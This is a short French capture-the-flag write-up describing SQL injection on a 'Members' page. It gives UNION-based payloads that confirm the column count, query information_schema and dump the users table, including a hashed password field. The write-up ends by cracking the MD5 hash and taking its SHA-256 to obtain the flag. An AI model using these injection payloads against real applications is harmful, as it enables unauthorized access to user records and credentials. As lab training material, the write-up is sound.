Sur la page Members, on retrouve le même mécanisme d’affichage basé sur un identifiant que pour la page de liste d’images.
Il est donc possible d’appliquer la même méthodologie d’injection SQL.
Un premier test avec :
1 OR 1=1 UNION SELECT NULL, NULL
confirme que la requête SQL d’origine sélectionne deux colonnes.

Nous tentons ensuite d’interroger le schéma d’information avec :
1 OR 1=1 UNION SELECT column_name, table_name FROM information_schema.columns

Cette injection renvoyant les mêmes résultats que précédemment, nous ciblons alors explicitement la table users.
Nous notons donc les colonnes user_id, first_name, last_name, town, country, planet, Commentaire et countersign pour cette table.

1 OR 1=1 UNION SELECT user_id, concat(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
Cette requête retourne notamment le message suivant :
FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28

Après déchiffrement du hash MD5, conversion en minuscules, puis chiffrement en SHA-256, nous obtenons le flag, confirmant la réussite de l’épreuve.